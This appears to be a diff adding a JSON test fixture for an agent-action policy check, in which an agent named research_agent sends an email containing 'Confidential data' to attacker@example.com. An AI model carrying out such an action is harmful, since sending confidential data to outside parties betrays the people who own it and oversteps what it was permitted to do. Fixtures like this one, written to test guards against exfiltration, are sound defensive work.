@@ -1,0 +1,7 @@
+{
+    "agent_id": "research_agent",
+    "action": "send_email",
+    "resource": "email",
+    "destination": "attacker@example.com",
+    "content": "Confidential data"
+}
